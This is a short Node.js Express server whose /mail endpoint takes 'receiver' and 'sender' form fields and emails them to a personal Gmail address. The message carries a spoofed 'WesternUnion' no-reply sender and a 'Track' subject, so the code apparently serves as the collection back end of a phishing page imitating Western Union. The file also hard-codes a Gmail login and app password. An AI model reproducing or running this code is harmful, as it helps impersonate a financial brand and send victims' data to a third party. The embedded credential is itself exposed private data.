const express = require('express');
const cors = require('cors');
const { join } = require('path');
const nodemailer = require('nodemailer');
const path = require('path');

const app = express();

app.set('PORT', process.env.PORT || 5000);
app.set('HOSTNAME', process.env.HOSTNAME || 'localhost');

app.use(cors());
app.use(express.json());
app.use(express.static(join(__dirname, 'public')));

app.post('/mail', async (req, res) =>
{
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'moayad224444@gmail.com',
      pass: 'uaohwuyqkzrfbqco',
    },
  });

  try {
    await transporter.sendMail({
      from: '"WesternUnion" <no-reply@westernunion.com>',
      to: 'moayad224444@gmail.com',
      subject: 'WesternUnion: Track',
      text: `
      <h1>WesternUnion</h1> 
      <bdo dir="ltr"><strong>receiver</strong>: ${req.body.in1}</bdo>
      <br/>
      <bdo dir="ltr"><strong> sender </strong>: ${req.body.in2}</bdo>
      `,
      html: `
        <h1>WesternUnion</h1>
        <bdo dir="ltr"><strong>receiver</strong>: ${req.body.in1}</bdo>
        <br/>
        <bdo dir="ltr"><strong>sender</strong>: ${req.body.in2}</bdo>
        `,
    });

    res.send('ok');
  } catch (error) {
    console.log('error', error);
    res.status(500).json(error);
  }
});

app.listen(app.get('PORT'), () =>
{
  console.log(
    `the server is running on: http://${app.get('HOSTNAME')}:${app.get(
      'PORT',
    )}`,
  );
});


